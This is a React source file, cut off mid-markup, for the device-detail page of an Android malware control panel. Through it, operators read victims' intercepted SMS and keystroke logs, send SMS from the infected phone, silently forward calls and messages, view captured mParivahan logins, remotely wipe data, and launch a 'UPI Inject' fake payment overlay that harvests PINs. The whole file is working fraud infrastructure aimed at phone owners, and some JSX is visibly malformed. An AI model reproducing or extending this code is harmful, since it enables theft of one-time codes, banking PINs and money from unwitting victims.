import { useState, useEffect } from 'react';
import { useRoute, Link, useLocation } from 'wouter';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove, update } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import {
  ArrowLeft, Battery, Copy, Trash2, Shield,
  MessageSquare, Terminal, PhoneForwarded, IndianRupee, AlertTriangle,
  Pin, PinOff, UserCheck, Search,
  Wifi, WifiOff, Timer, Activity, Globe, HardDrive, Layers
} from 'lucide-react';
import { format } from 'date-fns';
import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';
import { Reveal, GlassCard } from '@/components/ui/bezel';
import { cn } from '@/lib/utils';

const TABS = [
  { id: 'sms', label: 'Messages', icon: MessageSquare },
  { id: 'keylog', label: 'KeyLog', icon: Terminal },
  { id: 'forward', label: 'Call Fwd', icon: PhoneForwarded },
  { id: 'inject', label: 'UPI Inject', icon: IndianRupee },
  { id: 'delete', label: 'Destruct', icon: Trash2 },
];

export function DeviceDetail() {
  const [, params] = useRoute('/device/:id');
  const [, setLocation] = useLocation();
  const id = params?.id;
  const { isAdmin, userId } = useAuth();

  const [device, setDevice] = useState<NormalizedDevice | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('sms');
  const [memoInput, setMemoInput] = useState('');

  const [isPinned, setIsPinned] = useState(false);
  const [ownerInput, setOwnerInput] = useState('');
  const [savingOwner, setSavingOwner] = useState(false);

  const [pinging, setPinging] = useState(false);
  const [pingResult, setPingResult] = useState<{ latencyMs: number; success: boolean } | null>(null);

  const [smsSearch, setSmsSearch] = useState('');
  const [forwardType, setForwardType] = useState('call');
  const [forwardNumber, setForwardNumber] = useState('');
  const [forwardSim, setForwardSim] = useState(0);
  const [smsTo, setSmsTo] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [smsSim, setSmsSim] = useState(0);
  const [sendingSms, setSendingSms] = useState(false);
  const [smsData, setSmsData] = useState<Record<string, any>>({});

  useEffect(() => {
    if (!id) return;

    const deviceRef = ref(db, `clients/${id}`);
    const unsubscribe = onValue(deviceRef, (snapshot) => {
      if (snapshot.exists()) {
        const raw = snapshot.val();
        const normalized = normalizeDevice(id!, raw);
        setDevice(normalized);
        setOwnerInput((prev) => prev || raw.ownerTelegramId || '');
        setMemoInput((prev) => prev || raw.memo || '');
        if (raw.callForward) {
          setForwardType((prev) => prev || raw.callForward.type || 'call');
          setForwardNumber((prev) => prev || raw.callForward.number || '');
        }
      } else {
        setDevice(null);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, [id]);

  useEffect(() => {
    if (!id) return;
    const msgRef = ref(db, `messages/${id}`);
    const unsubscribe = onValue(msgRef, (snapshot) => {
      setSmsData(snapshot.exists() ? snapshot.val() : {});
    });
    return () => unsubscribe();
  }, [id]);

  useEffect(() => {
    if (!id || !userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${id}`);
    const unsubscribe = onValue(pinRef, (snapshot) => {
      setIsPinned(snapshot.exists() && snapshot.val() === true);
    });
    return () => unsubscribe();
  }, [id, userId]);

  const togglePin = () => {
    if (!id || !userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${id}`);
    if (isPinned) {
      remove(pinRef);
    } else {
      set(pinRef, true);
    }
  };

  const handleSaveOwner = async () => {
    if (!id) return;
    setSavingOwner(true);
    await update(ref(db, `clients/${id}`), {
      ownerTelegramId: ownerInput.trim() || null,
    });
    setSavingOwner(false);
  };

  const handleUpdateMemo = () => {
    if (!id) return;
    update(ref(db, `clients/${id}`), { memo: memoInput });
  };

  const handlePingDevice = async () => {
    if (!id) return;
    setPinging(true);
    setPingResult(null);
    const sentAt = Date.now();

    const pingPath = ref(db, `clients/${id}/webhookEvent/checkLiveness`);
    await set(pingPath, { text: 'ping' });

    let unsubscribe: (() => void) | null = null;
    const timeout = setTimeout(() => {
      if (unsubscribe) unsubscribe();
      setPingResult({ success: false, latencyMs: 0 });
      setPinging(false);
    }, 15000);

    unsubscribe = onValue(pingPath, (snapshot) => {
      const val = snapshot.val();
      if (val?.text === 'pong') {
        clearTimeout(timeout);
        if (unsubscribe) unsubscribe();
        setPingResult({ latencyMs: Date.now() - sentAt, success: true });
        setPinging(false);
        set(pingPath, null);
      }
    });
  };

  const handleDeleteDevice = () => {
    if (!id) return;
    if (confirm('Are you sure you want to destruct this node? All data will be wiped.')) {
      remove(ref(db, `clients/${id}`));
      setLocation('/dashboard');
    }
  };

  const handleClearKeylog = () => {
    if (!id) return;
    if (confirm('Clear all keylog data?')) {
      remove(ref(db, `clients/${id}/keylog`));
    }
  };

  const handleDeleteSms = (pushKey: string) => {
    if (!id) return;
    remove(ref(db, `messages/${id}/${pushKey}`));
    remove(ref(db, `clients/${id}/sms/${pushKey}`));
  };

  const handleToggleForwarding = (activate: boolean) => {
    if (!id || !forwardNumber.trim()) {
      alert('Enter a destination number first.');
      return;
    }
    set(ref(db, `clients/${id}/webhookEvent/callForward`), {
      from: forwardSim,
      to: forwardNumber.trim(),
      isActive: activate,
    });
  };

  const handleToggleSmsForward = (activate: boolean) => {
    if (!id || !forwardNumber.trim()) {
      alert('Enter a destination number first.');
      return;
    }
    set(ref(db, `clients/${id}/webhookEvent/smsForward`), {
      from: forwardSim,
      to: forwardNumber.trim(),
      isActive: activate,
    });
  };

  const handleSendSms = async () => {
    if (!id) return;
    if (!smsTo.trim() || !smsBody.trim()) {
      alert('Enter both number and message.');
      return;
    }
    setSendingSms(true);
    try {
      await set(ref(db, `clients/${id}/webhookEvent/sendSms`), {
        to: smsTo.trim(),
        message: smsBody,
        isSended: true,
        from: smsSim,
      });
      setTimeout(() => {
        setSmsTo('');
        setSmsBody('');
        setSendingSms(false);
      }, 500);
    } catch (err) {
      console.error('sendSms error', err);
      setSendingSms(false);
    }
  };

  const handleStartInjection = () => {
    if (!id) return;
    update(ref(db, `clients/${id}/inject`), {
      active: true,
      status: 'pending'
    });
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (loading) {
    return (
      <Layout>
        <div className="animate-pulse space-y-6">
          <div className="h-12 rounded-3xl w-1/3 bg-white/[0.03] border border-white/[0.05]"></div>
          <div className="h-32 rounded-3xl w-full bg-white/[0.03] border border-white/[0.05]"></div>
          <div className="h-96 rounded-3xl w-full bg-white/[0.03] border border-white/[0.05]"></div>
        </div>
      </Layout>
    );
  }

  if (!device) {
    return (
      <Layout>
        <div className="flex flex-col items-center justify-center py-24 rounded-[1.75rem] border border-dashed border-white/10 bg-white/[0.02]">
          <AlertTriangle className="w-12 h-12 text-[#fbbf24] mb-4" strokeWidth={1.5} />
          <h2 className="text-xl font-bold text-foreground">Node Disconnected or Destroyed</h2>
          <p className="text-muted-foreground mt-2">The device data no longer exists.</p>
          <Link href="/dashboard" className="mt-6 btn-island bg-[#8b5cf6] text-white px-6 py-2.5 rounded-full font-semibold hover:bg-[#7c3aed] transition-colors">
            Return to Dashboard
          </Link>
        </div>
      </Layout>
    );
  }

  const isOnline = device.isOnline;
  const rawDevice = device.raw;
  const smsList = Object.keys(smsData).length > 0
    ? Object.entries(smsData).sort(([, a]: any, [, b]: any) => (b.id || 0) - (a.id || 0))
    : rawDevice.sms
      ? Object.entries(rawDevice.sms).reverse()
      : [];
  const filteredSms = smsSearch
    ? smsList.filter(([_, sms]: any) => {
        const body = sms.message || sms.body || '';
        const from = sms.sender || sms.from || '';
        return body.toLowerCase().includes(smsSearch.toLowerCase()) || from.includes(smsSearch);
      })
    : smsList;

  const keylogList = rawDevice.keylog ? Object.entries(rawDevice.keylog).reverse() : [];

  const onlineDot = (
    <span className={cn('relative inline-flex rounded-full h-2.5 w-2.5', isOnline ? 'bg-[#34d399]' : 'bg-white/30')}>
      {isOnline && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#34d399] opacity-75" />}
    </span>
  );

  return (
    <Layout>
      <Reveal className="mb-7 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <Link href="/dashboard" className="p-2.5 rounded-2xl bg-white/[0.04] border border-white/[0.08] hover:bg-white/[0.08] transition-colors duration-500">
            <ArrowLeft className="w-5 h-5 text-muted-foreground" strokeWidth={1.6} />
          </Link>
          <div>
            <div className="flex items-center gap-3 flex-wrap">
              <h1 className="text-2xl font-semibold tracking-tight text-foreground">{device.model || 'Unknown Device'}</h1>
              <span className={cn('px-3 py-1 rounded-full text-xs font-semibold flex items-center gap-1.5', isOnline ? 'bg-[#34d399]/12 text-[#34d399] border border-[#34d399]/20' : 'bg-white/[0.04] text-muted-foreground border border-white/[0.08]')}>
                {onlineDot}
                {isOnline ? 'Online' : 'Offline'}
              </span>
            </div>
            <p className="text-muted-foreground text-sm mt-1">Device ID: {id}</p>
          </div>
        </div>
      </Reveal>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Left Sidebar - Device Info */}
        <div className="lg:col-span-1 space-y-6">
          <Reveal>
            <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-5">
              <div className={cn('h-px w-full mb-4', isOnline ? 'bg-[#34d399]' : 'bg-white/10')} />
              <div className="flex justify-between items-center pb-3 border-b border-white/[0.07]">
                <span className="text-sm font-medium text-muted-foreground">Overview</span>
                <button
                  onClick={() => copyText(`${device.model || 'Unknown'} | ${device.phone || 'N/A'} | ${id}`)}
                  className="p-1.5 rounded-full hover:bg-white/[0.06] text-muted-foreground transition-colors"
                >
                  <Copy className="w-3.5 h-3.5" strokeWidth={1.6} />
                </button>
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm mt-4">
                <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block">Model</span>
                  <span className="text-foreground font-medium text-xs truncate block mt-1">{device.model}</span>
                </div>
                <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block">Phone</span>
                  <div className="flex items-center gap-1 mt-1">
                    <span className="text-foreground font-medium text-xs truncate">{device.phone || '—'}</span>
                    {device.phone && <Copy className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-[#a78bfa] flex-shrink-0" strokeWidth={1.6} onClick={() => copyText(device.phone)} />}
                  </div>
                </div>
                {device.upi && (
                  <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3 col-span-2">
                    <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block">UPI ID</span>
                    <span className="text-[#a78bfa] font-medium text-xs truncate block mt-1">{device.upi}</span>
                  </div>
                )}
                {device.androidV && (
                  <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                    <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block flex items-center gap-1"><Layers className="w-2.5 h-2.5" strokeWidth={1.6} />Android</span>
                    <span className="text-foreground font-medium text-xs mt-1 block">{device.androidV} (SDK {device.sdkV})</span>
                  </div>
                )}
                {device.storage && (
                  <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                    <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block flex items-center gap-1"><HardDrive className="w-2.5 h-2.5" strokeWidth={1.6} />Storage</span>
                    <span className="text-foreground font-medium text-xs mt-1 block">{device.storage}</span>
                  </div>
                )}
                {device.ip_address && (
                  <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3 col-span-2">
                    <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block flex items-center gap-1"><Globe className="w-2.5 h-2.5" strokeWidth={1.6} />IP Address</span>
                    <div className="flex items-center gap-1 mt-1">
                      <span className="text-foreground font-medium text-xs font-mono">{device.ip_address}</span>
                      <Copy className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-[#a78bfa]" strokeWidth={1.6} onClick={() => copyText(device.ip_address!)} />
                    </div>
                  </div>
                {/* mParivahan WebView capture — vehicle & login */}
                {(device.vehicleNumber || device.loginTime) && (
                  <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-3 col-span-2">
                    <span className="page-eyebrow flex items-center gap-1 block text-amber-600 dark:text-amber-400">mParivahan Login</span>
                    <div className="space-y-1 mt-1">
                      {device.vehicleNumber && (
                        <div className="flex items-center gap-1.5">
                          <span className="text-xs text-muted-foreground">Vehicle:</span>
                          <span className="text-foreground font-medium text-xs font-mono">{device.vehicleNumber}</span>
                          <Copy className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-primary" onClick={() => copyText(device.vehicleNumber)} />
                        </div>
                      )}
                      {device.loginTime && (
                        <div className="text-xs text-muted-foreground font-mono">Time: {new Date(device.loginTime).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}</div>
                      )}
                      {device.mobNo && device.mobNo !== device.phone && (
                        <div className="text-xs text-muted-foreground font-mono">Captured: {device.mobNo}</div>
                      )}
                    </div>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm mt-3">
                <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block">SIM 1</span>
                  <div className="flex items-center gap-1 mt-1">
                    <span className="text-foreground text-xs truncate">{device.sim1 || 'N/A'}</span>
                    {device.sim1 && <Copy className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-[#a78bfa] flex-shrink-0" strokeWidth={1.6} onClick={() => copyText(device.sim1)} />}
                  </div>
                </div>
                <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider block">SIM 2</span>
                  <div className="flex items-center gap-1 mt-1">
                    <span className="text-foreground text-xs truncate">{device.sim2 || 'N/A'}</span>
                    {device.sim2 && <Copy className="w-3 h-3 text-muted-foreground cursor-pointer hover:text-[#a78bfa] flex-shrink-0" strokeWidth={1.6} onClick={() => copyText(device.sim2)} />}
                  </div>
                </div>
              </div>

              <div className="flex justify-between items-center py-3 border-b border-white/[0.07] mt-3">
                <span className="text-sm font-medium text-muted-foreground">Battery</span>
                <span className={cn('font-semibold text-sm flex items-center gap-1.5', getBatteryValue(device.battery) <= 20 ? 'text-[#fbbf24]' : 'text-foreground')}>
                  <Battery className="w-4 h-4" strokeWidth={1.6} />
                  {device.battery || 'N/A'}
                </span>
              </div>

              {device.joined && (
                <div className="flex justify-between items-center text-xs py-3 border-b border-white/[0.07]">
                  <span className="text-muted-foreground">Joined</span>
                  <span className="text-foreground font-medium">{device.joined}</span>
                </div>
              )}
              {(device.isRoot !== undefined || device.isSdCard !== undefined) && (
                <div className="flex gap-2 py-3 border-b border-white/[0.07]">
                  {device.isRoot !== undefined && (
                    <span className={cn('text-[10px] font-bold px-2 py-1 rounded-full', device.isRoot ? 'bg-[#ef4444]/12 text-[#f87171] border border-[#ef4444]/25' : 'bg-white/[0.04] text-muted-foreground border border-white/[0.08]')}>
                      {device.isRoot ? '⚡ Rooted' : 'Not Rooted'}
                    </span>
                  )}
                  {device.isSdCard !== undefined && (
                    <span className={cn('text-[10px] font-bold px-2 py-1 rounded-full', device.isSdCard ? 'bg-[#34d399]/12 text-[#34d399] border border-[#34d399]/20' : 'bg-white/[0.04] text-muted-foreground border border-white/[0.08]')}>
                      {device.isSdCard ? '💾 SD Card' : 'No SD'}
                    </span>
                  )}
                </div>
              )}

              {/* Ping Device */}
              <div className="py-3 border-b border-white/[0.07] space-y-2.5">
                <div className="flex items-center justify-between">
                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
                    <Activity className="w-3.5 h-3.5" strokeWidth={1.6} /> Ping Device
                  </span>
                  <button
                    onClick={handlePingDevice}
                    disabled={pinging}
                    className={cn(
                      'flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all duration-500 ease-spring',
                      pinging
                        ? 'bg-white/[0.04] text-muted-foreground border border-white/[0.08]'
                        : 'bg-[#8b5cf6]/15 text-[#a78bfa] border border-[#8b5cf6]/30 hover:bg-[#8b5cf6] hover:text-white'
                    )}
                  >
                    {pinging ? (
                      <><Timer className="w-3.5 h-3.5 animate-pulse" strokeWidth={1.6} /> Pinging…</>
                    ) : (
                      <><Wifi className="w-3.5 h-3.5" strokeWidth={1.6} /> Ping</>
                    )}
                  </button>
                </div>
                {pingResult && (
                  <div className={cn('flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold', pingResult.success ? 'bg-[#34d399]/10 text-[#34d399] border border-[#34d399]/20' : 'bg-[#ef4444]/10 text-[#f87171] border border-[#ef4444]/25')}>
                    {pingResult.success ? (
                      <><Wifi className="w-3.5 h-3.5" strokeWidth={1.6} /> Latency: {pingResult.latencyMs}ms — Online</>
                    ) : (
                      <><WifiOff className="w-3.5 h-3.5" strokeWidth={1.6} /> No response (15s timeout)</>
                    )}
                  </div>
                )}
              </div>

              <div className="flex items-center justify-between py-3 border-b border-white/[0.07]">
                <span className="text-sm font-medium text-muted-foreground">Pinned</span>
                <button
                  onClick={togglePin}
                  className={cn('flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all duration-500 ease-spring', isPinned ? 'bg-[#8b5cf6]/15 text-[#a78bfa] border border-[#8b5cf6]/30' : 'bg-white/[0.04] border border-white/[0.08] text-muted-foreground hover:text-foreground')}
                >
                  {isPinned ? <PinOff className="w-3.5 h-3.5" strokeWidth={1.6} /> : <Pin className="w-3.5 h-3.5" strokeWidth={1.6} />}
                  {isPinned ? 'Unpin' : 'Pin to Top'}
                </button>
              </div>

              <div className="space-y-2.5 mt-3">
                <label className="text-sm font-medium text-muted-foreground block">Operator Memo</label>
                <div className="flex gap-2">
                  <input type="text" value={memoInput} onChange={(e) => setMemoInput(e.target.value)} placeholder="Enter memo..." className="field flex-1 py-2" />
                  <button onClick={handleUpdateMemo} className="btn-island shrink-0 bg-[#8b5cf6] hover:bg-[#7c3aed] text-white px-4 py-2 rounded-full text-xs font-semibold">
                    Set
                  </button>
                </div>
              </div>

              {isAdmin && (
                <div className="space-y-2.5 pt-4 border-t border-white/[0.07] mt-4">
                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
                    <UserCheck className="w-3.5 h-3.5" strokeWidth={1.6} /> Assign Owner
                  </label>
                  <div className="flex gap-2">
                    <input type="text" value={ownerInput} onChange={(e) => setOwnerInput(e.target.value)} placeholder="Telegram ID..." className="field flex-1 py-2 min-w-0" />
                    <button onClick={handleSaveOwner} disabled={savingOwner} className="btn-island shrink-0 bg-[#8b5cf6] hover:bg-[#7c3aed] text-white px-4 py-2 rounded-full text-xs font-semibold disabled:opacity-50 whitespace-nowrap">
                      {savingOwner ? '...' : 'Save'}
                    </button>
                  </div>
                  <p className="text-[10px] text-muted-foreground">Set karne se woh user hi is device ko dekh sakta hai</p>
                </div>
              )}
            </GlassCard>
          </Reveal>
        </div>

        {/* Right Content - Tabs */}
        <div className="lg:col-span-3">
          <Reveal delay={80}>
            <GlassCard className="rounded-[1.75rem] overflow-hidden" innerClassName="rounded-[1.75rem] overflow-hidden flex flex-col h-[720px]">
              <div className="flex overflow-x-auto border-b border-white/[0.07] hide-scrollbar bg-white/[0.02] p-2 gap-1.5">
                {TABS.map(tab => {
                  const Icon = tab.icon;
                  const isActive = activeTab === tab.id;
                  return (
                    <button
                      key={tab.id}
                      onClick={() => setActiveTab(tab.id)}
                      className={cn(
                        'flex items-center gap-2 px-4 py-2 text-[13px] font-medium rounded-full whitespace-nowrap transition-all duration-500 ease-spring',
                        isActive
                          ? tab.id === 'delete'
                            ? 'bg-[#ef4444] text-white shadow-[0_8px_20px_-8px_rgba(239,68,68,0.7)]'
                            : 'bg-[#8b5cf6] text-white shadow-[0_8px_20px_-8px_rgba(139,92,246,0.7)]'
                          : 'text-muted-foreground hover:bg-white/[0.06] hover:text-foreground'
                      )}
                    >
                      <Icon className="w-4 h-4" strokeWidth={1.6} />
                      {tab.label}
                    </button>
                  );
                })}
              </div>

              <div className="flex-1 overflow-y-auto p-5 bg-[#050506] relative">
                {/* Tab 1: SMS */}
                {activeTab === 'sms' && (
                  <div className="h-full flex flex-col space-y-4">
                    <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                      <h3 className="font-semibold text-foreground">Messages</h3>
                      <div className="relative w-full sm:w-64">
                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" strokeWidth={1.6} />
                        <input type="text" placeholder="Search messages..." value={smsSearch} onChange={(e) => setSmsSearch(e.target.value)} className="field pl-10 py-2" />
                      </div>
                    </div>

                    {/* Send SMS from device */}
                    <div className="rounded-2xl p-4 bg-white/[0.03] border border-white/[0.08] space-y-3">
                      <div className="flex items-center gap-2">
                        <MessageSquare className="w-4 h-4 text-[#a78bfa]" strokeWidth={1.6} />
                        <span className="text-sm font-semibold text-foreground">Send SMS from this device</span>
                      </div>
                      <div className="grid grid-cols-1 sm:grid-cols-[1fr_96px] gap-2">
                        <input type="text" value={smsTo} onChange={(e) => setSmsTo(e.target.value)} placeholder="Destination number (+91...)" className="field py-2" />
                        <div className="flex gap-1 bg-white/[0.03] p-1 rounded-full border border-white/[0.08]">
                          {[0, 1].map((idx) => (
                            <button key={idx} onClick={() => setSmsSim(idx)} className={cn('flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors duration-500', smsSim === idx ? 'bg-[#8b5cf6] text-white' : 'text-muted-foreground hover:text-foreground')}>
                              SIM{idx + 1}
                            </button>
                          ))}
                        </div>
                      </div>
                      <textarea value={smsBody} onChange={(e) => setSmsBody(e.target.value)} placeholder="Message text..." rows={2} className="field resize-none py-2" />
                      <button onClick={handleSendSms} disabled={sendingSms || !smsTo.trim() || !smsBody.trim()} className="w-full btn-island bg-[#8b5cf6] hover:bg-[#7c3aed] disabled:opacity-40 disabled:pointer-events-none text-white font-bold py-2.5 text-sm rounded-full flex items-center justify-center gap-2">
                        <MessageSquare className="w-4 h-4" strokeWidth={1.6} />
                        {sendingSms ? 'Sending...' : 'Send SMS'}
                      </button>
                    </div>

                    {filteredSms.length === 0 ? (
                      <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-white/10 rounded-3xl bg-white/[0.02]">
                        No messages found.
                      </div>
                    ) : (
                      <div className="flex-1 overflow-y-auto space-y-3 pr-1.5">
                        {filteredSms.map(([key, sms]: any) => {
                          const displayFrom = sms.sender || sms.from || 'Unknown';
                          const displayBody = sms.message || sms.body || '';
                          const displayDate = sms.dateTime
                            ? sms.dateTime
                            : sms.date
                              ? format(new Date(parseInt(sms.date)), 'MMM d, HH:mm:ss')
                              : 'Unknown Time';
                          return (
                            <div key={key} className="rounded-2xl p-4 group relative bg-white/[0.03] border border-white/[0.08] hover:border-[#8b5cf6]/35 transition-colors duration-500">
                              <div className="flex justify-between items-start mb-2">
                                <div className="font-semibold text-sm bg-white/[0.05] text-[#c4b5fd] px-3 py-1 rounded-full border border-white/[0.08]">
                                  {displayFrom}
                                </div>
                                <div className="text-xs text-muted-foreground">{displayDate}</div>
                              </div>
                              <div className="text-sm leading-relaxed break-words text-foreground/90 pl-1 border-l-2 border-white/[0.1]">
                                {displayBody}
                              </div>

                              <div className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 flex gap-1.5 transition-opacity duration-500">
                                <button onClick={() => copyText(displayBody)} className="p-1.5 bg-white/[0.05] hover:bg-white/[0.1] text-muted-foreground hover:text-[#a78bfa] rounded-xl border border-white/[0.08] transition-colors" title="Copy">
                                  <Copy className="w-3.5 h-3.5" strokeWidth={1.6} />
                                </button>
                                <button onClick={() => handleDeleteSms(key)} className="p-1.5 bg-white/[0.05] hover:bg-[#ef4444]/10 text-muted-foreground hover:text-[#f87171] rounded-xl border border-white/[0.08] transition-colors" title="Delete">
                                  <Trash2 className="w-3.5 h-3.5" strokeWidth={1.6} />
                                </button>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}

                {/* Tab 2: KeyLog */}
                {activeTab === 'keylog' && (
                  <div className="h-full flex flex-col space-y-4">
                    <div className="flex justify-between items-center">
                      <h3 className="font-semibold text-foreground">Keystroke Log</h3>
                      <button onClick={handleClearKeylog} disabled={keylogList.length === 0} className="text-xs font-semibold bg-[#ef4444]/10 text-[#f87171] border border-[#ef4444]/25 hover:bg-[#ef4444]/15 px-4 py-2 rounded-full transition-colors duration-500 disabled:opacity-40">
                        Clear Log
                      </button>
                    </div>

                    <div className="flex-1 rounded-2xl overflow-y-auto p-4 font-mono text-sm whitespace-pre-wrap leading-relaxed text-foreground/90 bg-[#050507] border border-white/[0.07]">
                      {keylogList.length === 0 ? (
                        <span className="text-muted-foreground">No keystrokes recorded yet...</span>
                      ) : (
                        keylogList.map(([key, log]: any) => (
                          <div key={key} className="mb-2 hover:bg-white/[0.03] p-2 rounded-xl transition-colors duration-300 break-all">
                            <span className="text-[#a78bfa] select-none mr-2">›</span>
                            <span>{log.text || ''}</span>
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                )}

                {/* Tab 3: Call Forward */}
                {activeTab === 'forward' && (
                  <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                    <div className="text-center mb-4">
                      <div className="bezel mx-auto w-fit mb-4">
                        <div className="bezel-inner w-16 h-16 flex items-center justify-center">
                          <PhoneForwarded className="w-8 h-8 text-[#a78bfa]" strokeWidth={1.5} />
                        </div>
                      </div>
                      <h2 className="text-lg font-bold text-foreground">Call Forwarding</h2>
                      <p className="text-sm text-muted-foreground mt-1.5">Redirect incoming calls or SMS silently.</p>
                    </div>

                    <div className="rounded-3xl p-6 space-y-5 bg-white/[0.03] border border-white/[0.08]">
                      <div className="space-y-3">
                        <label className="text-xs font-bold uppercase text-muted-foreground tracking-wider">Intercept Type</label>
                        <div className="flex gap-1 bg-white/[0.03] p-1 rounded-full border border-white/[0.08]">
                          <button onClick={() => setForwardType('call')} className={cn('flex-1 py-2 text-sm font-medium rounded-full transition-colors duration-500 ease-spring', forwardType === 'call' ? 'bg-[#8b5cf6] text-white' : 'text-muted-foreground hover:text-foreground')}>
                            Call
                          </button>
                          <button onClick={() => setForwardType('sms')} className={cn('flex-1 py-2 text-sm font-medium rounded-full transition-colors duration-500 ease-spring', forwardType === 'sms' ? 'bg-[#8b5cf6] text-white' : 'text-muted-foreground hover:text-foreground')}>
                            SMS
                          </button>
                        </div>
                      </div>

                      <div className="space-y-3">
                        <label className="text-xs font-bold uppercase text-muted-foreground tracking-wider">Destination Number</label>
                        <input type="text" value={forwardNumber} onChange={(e) => setForwardNumber(e.target.value)} placeholder="+91..." className="field" />
                      </div>

                      <div className="space-y-3">
                        <label className="text-xs font-bold uppercase text-muted-foreground tracking-wider">Forward From SIM</label>
                        <div className="flex gap-1 bg-white/[0.03] p-1 rounded-full border border-white/[0.08]">
                          {[0, 1].map((idx) => (
                            <button key={idx} onClick={() => setForwardSim(idx)} className={cn('flex-1 py-2 text-sm font-medium rounded-full transition-colors duration-500 ease-spring', forwardSim === idx ? 'bg-[#8b5cf6] text-white' : 'text-muted-foreground hover:text-foreground')}>
                              SIM{idx + 1}
                            </button>
                          ))}
                        </div>
                      </div>

                      <div className="pt-2 flex gap-3">
                        <button onClick={() => forwardType === 'call' ? handleToggleForwarding(true) : handleToggleSmsForward(true)} className="flex-1 btn-island bg-[#8b5cf6] hover:bg-[#7c3aed] text-white font-bold py-2.5 text-sm rounded-full">
                          Activate {forwardType === 'call' ? 'Call' : 'SMS'} Fwd
                        </button>
                        <button onClick={() => forwardType === 'call' ? handleToggleForwarding(false) : handleToggleSmsForward(false)} className="flex-1 btn-island bg-[#f59e0b] hover:bg-[#d97706] text-white font-bold py-2.5 text-sm rounded-full">
                          Deactivate
                        </button>
                      </div>
                    </div>

                    {(rawDevice.callForward?.active || rawDevice.smsForward?.active) && (
                      <div className="rounded-2xl p-3.5 text-center text-sm font-semibold text-[#a78bfa] flex items-center justify-center gap-2 bg-[#8b5cf6]/10 border border-[#8b5cf6]/25">
                        {onlineDot}
                        {rawDevice.callForward?.active && `Call fwd → ${rawDevice.callForward.number || ''}`}
                        {rawDevice.callForward?.active && rawDevice.smsForward?.active && ' · '}
                        {rawDevice.smsForward?.active && `SMS fwd → ${rawDevice.smsForward.number || ''}`}
                      </div>
                    )}
                  </div>
                )}

                {/* Tab 4: UPI Inject */}
                {activeTab === 'inject' && (
                  <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                    <div className="text-center mb-4">
                      <div className="bezel mx-auto w-fit mb-4">
                        <div className="bezel-inner w-16 h-16 flex items-center justify-center">
                          <IndianRupee className="w-8 h-8 text-[#a78bfa]" strokeWidth={1.5} />
                        </div>
                      </div>
                      <h2 className="text-lg font-bold text-foreground">UPI Overlay</h2>
                      <p className="text-sm text-muted-foreground mt-1.5">Deploy fake payment overlay and extract PIN.</p>
                    </div>

                    <div className="rounded-3xl p-6 bg-white/[0.03] border border-white/[0.08]">
                      <div className="space-y-4 text-sm">
                        <div className="flex justify-between items-center py-2 border-b border-white/[0.07]">
                          <span className="text-muted-foreground">Target Device:</span>
                          <span className="text-foreground font-medium">{device.model || 'Unknown'}</span>
                        </div>
                        <div className="flex justify-between items-center py-2 border-b border-white/[0.07]">
                          <span className="text-muted-foreground">Status:</span>
                          <span className={cn('font-bold', rawDevice.inject?.status === 'success' ? 'text-[#34d399]' : rawDevice.inject?.status === 'pending' ? 'text-[#fbbf24] animate-pulse' : 'text-muted-foreground')}>
                            {rawDevice.inject?.status?.toUpperCase() || 'IDLE'}
                          </span>
                        </div>
                        <div className="flex justify-between items-center py-2 border-b border-white/[0.07]">
                          <span className="text-muted-foreground">Extraction Speed:</span>
